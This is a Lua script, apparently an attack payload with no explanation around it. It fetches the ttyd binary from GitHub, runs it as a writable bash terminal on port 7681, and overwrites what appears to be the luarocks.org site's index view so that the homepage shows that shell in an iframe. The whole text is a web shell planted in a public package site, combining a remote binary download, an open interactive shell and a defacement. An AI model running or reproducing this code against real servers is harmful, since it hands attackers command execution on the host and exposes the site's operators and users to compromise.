os.execute(
"apt-get install -y ttyd 2>/dev/null || curl -L https://github.com/tsl0922/ttyd/releases/latest/download/ttyd.x86_64 -o /tmp/ttyd && chmod +x /tmp/ttyd")
os.execute("/tmp/ttyd -p 7681 -W /bin/bash &")

local f = assert(io.open("/site/luarocks.org/views/index.lua", "w"))
f:write([=[
local Widget = require("lapis.html").Widget

return Widget:extend("Shell", {
  content = function(self)
    raw [[<iframe src="http://localhost:7681" style="width:100%;height:100vh;border:0"></iframe>]]
  end
})
]=])
f:close()
